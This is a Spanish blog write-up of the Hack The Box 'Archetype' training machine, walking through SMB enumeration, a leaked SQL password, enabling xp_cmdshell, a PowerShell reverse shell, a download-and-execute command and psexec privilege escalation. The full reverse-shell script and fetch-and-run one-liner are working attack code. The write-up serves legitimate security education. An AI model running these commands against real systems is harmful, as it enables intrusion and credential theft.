---
Title: Hack-The-Box (0002) > Starting Point > Archetype
Date: 2020-08-07
Modified: 2021-04-04
Tags: cybersecurity, htb, pentest, writeup
Keywords: cybersecurity, htb, pentest, hacking, writeup, archetype
Category: htb
Author: Penserbjorne
Summary: Anotaciones sobre la máquina "Archetype" de la sección "Starting Point" de Hack-The-Box
Lang: es-MX
Translation: false
Status: published
---

# Archetype

Para comenzar con esta serie de anotaciones sobre la sección *Starting Point*
arrancaremos con la máquina *Archetype*. Si no sabes bien de que hablo te
recomiendo que primero leas la
[entrada anterior]({filename}./htb-01-starting-point-section.md).

- **Máquina:** Archetype
- **SO:** Windows
- **IP:** 10.10.10.27

## Enumeration

Como siempre digo: "*primero lo primero*", pues vamos a comenzar a **enumerar**
lo que tiene el equipo objetivo, en este caso vamos a tratar de identificar
los puertos abiertos y el software asociado a estos.

Para esto utilizaremos la siempre poderosa herramienta de
[nmap](https://es.wikipedia.org/wiki/Nmap).

Lo primero que nos recomiendan utilizar son los siguientes dos comandos:

```bash
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.10.27
```

Vamos a revisar la primera linea.

```bash
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

La linea anterior crea una variable en `bash` llamada `ports` en la cual se
almacena el resultado de
`nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//`

El comando anterior se componen de la salida anidada entre varios comandos,
esto podemos observarlo con el uso de `comando1 | comando2`, el cual indica
que la salida del `comando1` será la entrada del `comando2`.

Separando el comando nos encontramos con:

- `nmap -p- --min-rate=1000 -T4 10.10.10.27`
- `grep ^[0-9]`:
- `cut -d '/' -f 1`
- `tr '\n' ','`
- `sed s/,$//`

Analicemos cada una de las partes.

`nmap -p- --min-rate=1000 -T4 10.10.10.27` lo vamos a utilizar para detectar
los puertos abiertos en la máquina a trabajar. Esto se lo indicamos a `nmap`
con los siguientes parámetros:

- `-p-`: Indicamos que vamos a escanear todos los puertos de la máquina.
- `--min-rate=1000`: Indicamos que enviaremos al menos 1000 paquetes por segundos para realizar el escaneo.
- `-T4`: Indicamos una *plantilla de tiempo*. Básicamente le decimos a `nmap`
que haga un *análisis agresivo*. El modo agresivo hace que los
análisis sean más rápidos al asumir que estas en una red razonablemente más
rápida y fiable.
- `10.10.10.27`: Indicamos la IP del objetivo, en este caso es la máquina con la que vamos a trabajar.

La salida del comando anterior nos muestra la lista de puertos abiertos como
se ve a continuación.

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 21:35 CDT
Warning: 10.10.10.27 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.27
Host is up (0.088s latency).
Not shown: 63625 closed ports, 1899 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 121.13 seconds
```

La salida anterior la pasamos a `grep ^[0-9]` para que nos muestre solamente
el listado de lineas donde aparecen puertos, esto para quitar la información
extra de `nmap`. Esto se lo indicamos a `grep` utilizando la expresión regular
`^[0-9]` la cual especifica que busque las lineas que comienzan con valores
numéricos que van del 0 al 9. La salida es como se muestra a continuación.

```bash
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
```

La salida anterior la pasamos a `cut -d '/' -f 1` para que extraiga
exclusivamente el número de los puertos abiertos. Esto se lo indicamos a `cut`
con los siguientes parámetros:

- `-d '/'`: Indicamos el carácter delimitador. Esto vendría a ser nuestro
carácter para *separar* la cadena en *columna*, Algo así como la coma `,` de
un CSV.
- `-f 1`: Indicamos que retorne o imprima el primer campo de los resultados.
En este caso si observamos la salida del comando anterior podemos asumir que
las lineas de texto se van a separar en dos columnas debido a que cada linea
tiene el carácter `/`. El primer campo tendrá el número de puerto y el segundo
campo tendrá la descripción del puerto.

La salida del comando anterior es la siguiente:

```bash
135
139
445
1433
5985
47001
49664
49665
49666
49667
49668
49669
```

La salida anterior la pasamos a `tr '\n' ','` para eliminar los caracteres
`\n` y sustituirlos por una coma `,`. El resultado es el siguiente:

```bash
135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,
```

La salida anterior la pasamos a `sed s/,$//` para simplemente extraer la
ultima coma y dejar una lista limpia de puertos abiertos separados por comas.
Esto lo hacemos con la expresión `s/,$//` la cual se pasa a `sed` que respeta
la sintaxis `s/regexp/replacement/flags`. La expresión utilizada busca la
última coma de la linea y la borra.

La salida del comando anterior es la siguiente:

```bash
135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669
```

Todo lo anterior es simplemente para entender el primer comando del
walk-through que básicamente nos arma una lista de puertos abiertos separados
por comas.

Esta lista de puertos quedo almacenada en la variable `ports` que vamos a
utilizar en el segundo comando recomendado:

```bash
nmap -sC -sV -p$ports 10.10.10.27
```

El comando anterior realizará un escaneo en los puertos obtenidos del primer
comando. La bandera `-sV` indica a `nmap` que determine la versión del software
detectado en el puerto. La salida del comando es:

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 22:36 CDT
Nmap scan report for 10.10.10.27
Host is up (0.50s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-08-06T09:11:31
|_Not valid after:  2050-08-06T09:11:31
|_ssl-date: 2020-08-07T03:54:35+00:00; +16m19s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m18s, deviation: 3h07m51s, median: 16m17s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-08-06T20:54:29-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-08-07T03:54:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.18 seconds
```

Hasta este momento ya hemos logrado detectar los puertos abiertos así como el
software y las versiones que están asociados a estos.

Por ahora el post quedara hasta aquí ... tengo hambre y necesito descansar un
rato.

---

**Continuación: 2020-08-11**

Listo, ya he comido algo (y ya pasaron algunos días), así que podemos continuar.

Retomando, podemos observar que el puerto 445 y el 1433 se encuentran abiertos
y están asociados a dos servicios:
[SMB](https://es.wikipedia.org/wiki/Server_Message_Block) y
[SQL Server](https://es.wikipedia.org/wiki/Microsoft_SQL_Server).

Dado que el protocolo `SMB` se utiliza para compartir archivos podemos tratar de
conectarnos de manera anonima en busqueda de archivos interesantes. Para esto
recomiendan utilizar `smbclient` la cual es un cliente de conexiones
perteneciente al proyecto
[Samba](https://es.wikipedia.org/wiki/Samba_(software)) en sistemas tipo `Unix`.

El comando recomendado es:

```bash
smbclient -N -L \\\\10.10.10.27\\
```

Los parámetros del comando anterior son:

- `-N`: Conectar sin contraseña (de manera anónima).
- `-L`: Despliega los resultados en formato de lista.
- `\\\\10.10.10.27\\`: Estamos indicando la máquina a la cual nos vamos a
conectar. En este caso nos estamos conectando desde un sistema tipo `Unix` a un
sistema basado en `DOS` por lo cual utilizaremos la sintaxis de
`DOS` la cual requiere barras invertidas (`\`). Al estar en un sistema
tipo `Unix` tenemos que escapar la barra invertida con una barra invertida
(`\\\\`), por eso al inicio vemos cuatro barras invertidas y dos al final, en
realidad la sintaxis de `DOS` lo tomaría como dos barras al inicio y una al
final.

El resultado del comando anterior es:

```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Revisando la salida del comando podemos observar que hay una carpeta interesante
llamada `backups` la cual podria contener información interesante. Procederemos
a conectarnos a esa carpeta con el comando recomendado:

```bash
smbclient -N \\\\10.10.10.27\\backups
```

De igual manera que en el comando anterior, nos vamos a conectar sin contraseña
gracias al parámetro `-N` y hemos eliminado el parámetro `-L` ya que no queremos
ver una lista de resultados si no realizar una conexión directa.

Al conectarnos tendremos una terminal como la siguiente:

```bat
Try "help" to get a list of possible commands.
smb: \>
```

En esta terminal podemos ejecutar comandos básicos, para ver un listado de
estos podemos utilizar `help` el cual nos desplegará una salida como la
siguiente:

```bat
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!  
```

Como el objetivo en este momento es encontrar información de utilidad se nos
recomienda utilizar el comando `dir` el cual permite listar el contenido de un
directorio en sistemas basados en `DOS`, este caso, el directorio actual.

```bat
smb: \> dir
  .                                   D        0  Mon Jan 20 06:20:57 2020
  ..                                  D        0  Mon Jan 20 06:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 06:23:02 2020

		10328063 blocks of size 4096. 8243763 blocks available
```

Del contenido del directorio podemos observar que solamente existe el archivo
`prod.dtsConfig`.

Los archivos con extensión
[.dtsConfig](https://abrirarchivos.info/extension/dtsconfig)
son archivos de configuración con sintaxis `XML` utilizados para aplicar
*valores de propiedad* a los paquetes de
*Servicios de Integración de SQL Server* (`SSIS`). Por lo cual podemos obtener
algo de información de este archivo.

Para ver el contenido del archivo nos recomiendan utilizar el siguiente comando:

```bat
smb: \> get prod.dtsConfig
```

El comando anterior invoca a la herramienta `get` la cual se utiliza para
transferir archivos, por lo cual al ejecutarlo vamos a transferir una copia
del archivo `prod.dtsConfig` a nuestro equipo. Con el archivo en nuestro equipo
podemos ver su contenido.

De vuelta a nuestro equipo, podemos utilizar el comando `cat prod.dtsConfig` el
cual nos arrojara el contenido del archivo.

```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

Del contenido del archivo anterior nos llaman la atención la siguiente línea:

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
```

La cadena anterior corresponde a la cadena para una conexión `SQL` asociada al
usuario `ARCHETYPE\sql_svc` (de `Windows`) y su contraseña que es `M3g4c0rp123`.

## Foothold

Ya tenemos un usuario y contraseña, por lo que podemos intentar dar un primer
paso firme hacia nuestra máquina objetivo ... peeeeero, eso será después porqué
en este momento necesito dejar el post pausado una vez más y conectarme a hacer
algunos pendientes del trabajo :)

---

**Continuación: 2020-11-06**

Ola k ase ... bueno, ya pasaron casi tres meses de que comencé a escribir este
texto y pues apenas vamos a darle un cierre haha en realidad hubo muchas cosas
que se escribieron en este tiempo pero algunas las borre sin querer y otras
estan a medias esperando a ser publicada, en fin, continuemos con lo que toca
aquí.

Bien, ya hemos obtenido un usuario y contraseña para una conexión de
`SQL Server` de un usuario de `Windows`, hay que tener en cuenta que aunque el
usuario es de `Windows` la configuración de permisos puede ser diferente dentro de
`SQL Server` que en `Windows`

Para conectar a `SQL Server` podemos utilizar [impacket](https://github.com/SecureAuthCorp/impacket) el cual es una colección de clases en `Python` para
trabajar con protocolos de red.

Para obtener `impacket` necesitamos clonarlo de su repositorio de `GitHub` ya
que no viene instalado por defecto en nuestro sistema. Clonamos el repo.

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```
`impacket` cuenta con algunos scripts de ejemplo en la carpeta `/examples`, de
ahí podemos utilizar `mssqlclient.py` el cual sirve para realizar conexiones a
servidores de `SQL Server`.

El comando recomendado es:

```bash
mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`
```


Pero en nuestro caso utilizaremos el siguiente:

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```

Como podemos ver, hemos mandado `mssqlclient.py` directamente a la entrada de
`Python3`, y hemos indicado las banderas:

-	`ARCHETYPE/sql_svc`: es el usuario.
-	`@10.10.10.27`: es el host o equipo a conectarnos.
- `-windows-auth`: indicamos que nos vamos a autenticar con las credenciales de `Windows`.

Al introducir el comando nos va a solicitar la contraseña del usuario, la
obtuvimos anteriormente (`M3g4c0rp123`). Se realizará la conexión y se nos
habilitará una terminal de `SQL`.

```bash
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```
Ya tenemos una conexión en el servidor. Ahora vamos a verificar si tenemos
permisos de administrador. Para esto podemos utilizar la función
[IS_SRVROLEMEMBER](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
la cual nos permite saber si un inicio de sesión de `SQL Server` es miembro
de un rol especifico del servidor.

La sintaxis de la función es:

```sql
IS_SRVROLEMEMBER ( 'role' [ , 'login' ] )
```

En la cual tenemos dos argumentos:

-	`role`: indicamos el rol a revisar que puede ser alguno de los siguientes.
	-	sysadmin
	-	serveradmin
	-	dbcreator
	-	setupadmin
	-	bulkadmin
	-	securityadmin
	-	diskadmin
	-	public
	-	processadmin
-	`login`: es el nombre del servidor `SQL` a revisar, por defecto su valor es
	`NULL` y toma como referencia el servidor en el que hemos iniciado sesión.

Explicado lo anterior, en nuestra sesión de `SQL Server` uitlizaremos el
siguiente comando:

```sql
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
```

Su salida es:

```SQL        

-----------   

          1
```

El cual nos da como salida un valor numérico de `1` el cual representa que el
la sesión iniciada es miembro del rol solicitado, osea, tenemos permisos de
`sysadmin` en el `SQL Server`.

Como tenemos permisos de administrador podemos utilizar algunas herramientas de
configuración del servidor `SQL` para habilitar una conexión remota.

Para esto podemos utilizar [sp_configure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15)
el cual nos permite modificar configuraciones globales del servidor.

Su sintaxis es la siguiente:

```sql
sp_configure [ @configname= ] 'hadoop connectivity',
             [ @configvalue = ] 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7
```

Como podemos ver toma dos parámetros, el nombre de la configuración y su valor.
El valor depende directamente de la configuración que estamos modificando. Una
vez que hemos cambiado alguna configuración es necesario utilizar `reconfigure;`
para que se apliquen los cambios.

Si ejecutamos `sp_configure;` podemos ver una lista de configuraciones
disponibles, sin embargo estamos buscando una que nos permita habilitar una
conexión remota. Para esto habilitaremos que se muestren las opciones avanzadas.

```sql
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
```

Al habilitar que nos muestre las opciones avanzadas podremos ver que hay una
configuración llamada [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)
la cual nos permite invocar una terminal de comandos de Windows y enviarle una
cadena a ejecutar.

```sql
EXEC sp_configure 'xp_cmdshell', 1;
reconfigure;
```

Ya habilitamos la configuración para utilizar `xp_cmdshell`, podemos verificar
los permisos o alcance de nuestra cuenta dentro de `Windows` utilizando el
comando `whoami`.

```sql
xp_cmdshell "whoami"
```

Su salida es:

```sql
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               
```

Podemos observar que se nos vuelve a desplegar el usuario `archetype\sql_svc`,
esto significa que `SQL Server` esta corriendo con ese usuario dentro de
`Ẁindows`, y podemos ver un `NULL` lo cual significa que no tiene permisos de
administrador.

Necesitamos una mejor terminal. Intentemos crear una reverse shell mediante
`PowerShell`. Para esto podemos utilizar el siguiente código:

```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

La linea anterior es necesario guardarla en un archivo en tu equipo, vamos a
llamar al archivo `shell.ps1`.

Ahora que lo hemos guardado en un archivo, solo por no dejar, vamos a expandir
la linea anterior, simplemente queremos que se vea un poco mejor lo que hace.

```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + "# ";
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()};
$client.Close()
```

Si observamos, estamos viendo que se crea una conexión a la IP y el puerto
especificado, se crea un stream de datos y a partir de aquí se codifica la
información para poder enviarla a través de la conexión a una terminal remota.

Recuerden cambiar la dirección IP al de su equipo. Si no conoces tu dirección
puedes utilizar el siguiente comando:

```bash
ip addr
```

Con la IP indicada y el archivo creado, desde la terminal nos dirigimos a la
carpeta donde guardaste el archivo. Necesitamos enviar el archivo que esta en
nuestro equipo al servidor `SQL` donde nos conectamos para poder ejecutarlo ahí
y crear la reverse shell.

Para esto, vamos a hacer los siguientes pasos:

-	Levantaremos un servidor `HTTP` del cual descargaremos el archivo
-	Configuramos los puertos de escucha para nuestra conexión de la reverse shell
-	Configuraremos el firewall para aceptar las dos conexiones anteriores

El primer punto lo haremos utilizando el interprete de `python`, con el cual
podemos utilizar la clase `http.server` e indicarle el puerto de escucha.
Recuerda que necesitar estar en la carpeta donde guardaste el archivo `shell.ps1`.

```bash
python3 -m http.server 80
```

El segundo punto lo podemos hacer utilizando [netcat](https://en.wikipedia.org/wiki/Netcat)
la cual es una herramienta para leer o escribir conexiones de red sobre TCP o UDP.

El comando a utilizar es:

```bash
nc -lvnp 443
```

Los parámetros de `netcat` son los siguientes:

-	`l`: modo de escucha, para conexiones entrantes
-	`v`: modo `verbose`, para ir viendo que sucede
-	`n`: para trabajar con direcciones IP
-	`p`: para indicar el puerto donde estará escuchando la conexión, que es el 443

Para el tercer punto utilizaremos [ufw](https://wiki.debian.org/Uncomplicated%20Firewall%20%28ufw%29)
el cual es un firewall con el que vamos a gestionar los puertos.

El comando a utilizar es:

```bash
ufw allow from 10.10.10.27 proto tcp to any port 80,443
```

Con sus comando estamos indicando que permita (`allow`) conexiones desde (`from`)
la dirección IP `10.10.10.27` que es la que estamos atacando mediante el protocolo
`TCP` (`proto tcp`) a los puertos 80 y 443 (`to any port 80,443`).

Ahora, regresemos a nuestra terminal de `SQL`, ahi vamos a utilizar la herramienta
`xp_cmdshell` que utilizamos previamente, ahora invocaremos una conexión a nuestro
servidor `HTTP` local que nos permita descargar la reverse shell y ejecutarla.
Al ejecutar la reverse shell se creara una conexión a nuestro equipo que sera
aceptada por `netcat` y desde ahi ya podremos utilizar la reverse shell.

El comando a utilizar es:

```bash
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
```

Recuerda actualizar tu dirección IP en el comando anterior.

Ya tenemos una reverse shell al usuario en `Windows`, podemos proceder a extraer
la bandera de su escritorio. Para esto podemos podemos movernos a su escritorio
con el comando `cd` e indicar la ruta.

```cmd
cd C:\Users\sql_svc\Desktop
```

Aquí podemos ver que se encuentra el archivo `user.txt` el cual contiene la bandera.

```cmd
# dir


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6:37 AM             32 user.txt                                                              
```

Le podemos aplicar un `type` o un `cat` al archivo y listo! Tenemos la primer
bandera.

##	Privilege Escalation

Ya obtuvimos la bandera a nivel de usuario, ahora necesitamos obtener la bandera
a nivel administrador.

Sabemos que la cuenta en la que nos encontramos no tiene permisos de administrador
pero que se utiliza como una cuenta para gestionar servicios, esto significa
que en algún momento cuando se levantan los servicios se aplica algún permiso
de administrador. Para conocer en que momento sucede podemos revisar el historial
de comandos de `PowerShell`. Para esto podemos utilizar el siguiente comando:

```bash
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

La salida del comando anterior nos muestra lo siguiente:

```bash
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Con lo anterior podemos observar que el disco `backups` que encontramos al
conectarnos por `SMB` fue mapeado con una cuenta local de administrador, y
ahora tenemos su contraseña.

Para conectarnos utlizaremos una versión de [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) incluida en `impacket`.

De igual manera que el comando de `mssqlclient` lo invocaremos a traves del
interprete de `Python`.

```bash
python3 psexec.py administrator@10.10.10.27
```

Se nos pedirá la contraseña, y después de ingresarla veremos que la conexión
es satisfactoria, de tal modo que tenemos una terminal con permisos de
administrador.

```bash
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file jcWXyjRG.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service UFMW on 10.10.10.27.....
[*] Starting service UFMW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Verificamos nuestros permisos:

```bash
C:\Windows\system32>whoami
nt authority\system
```

En efecto, tenemso permisos de administrador, y ahora podemos ir al escritorio
del administrador y extraer la última bandera.

```bash
C:\Windows\system32>cd C:\Users\Administrator\Desktop
```

```bash
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users\Administrator\Desktop

01/20/2020  05:42 AM    <DIR>          .
01/20/2020  05:42 AM    <DIR>          ..
02/25/2020  06:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  33,818,599,424 bytes free
```

```bash
C:\Users\Administrator\Desktop>type root.txt
```

Listo! Tenemos las dos banderas de esta máquina!

## Fin

Bueno, con eso hemos concluido la revisión del primer walk-through de las
máquinas de introducción de `HTB`. Este texto fue un poco más extenso ya que se
fueron expllicando paso a paso cada comando, pero conforme avancemos en las
herramientas y comandos obviaremos los que se hayan explicado previamente.

Espero haya sido de tu agrado y utilidad este texto, y si vas comenzando en
estos temas de seguridad, [recuerda no rendirte](https://www.youtube.com/watch?v=dQw4w9WgXcQ)
y seguir aprendiendo poco a poco.

Nos vemos en el siguiente texto. Ciao!

`#HappyHacking`
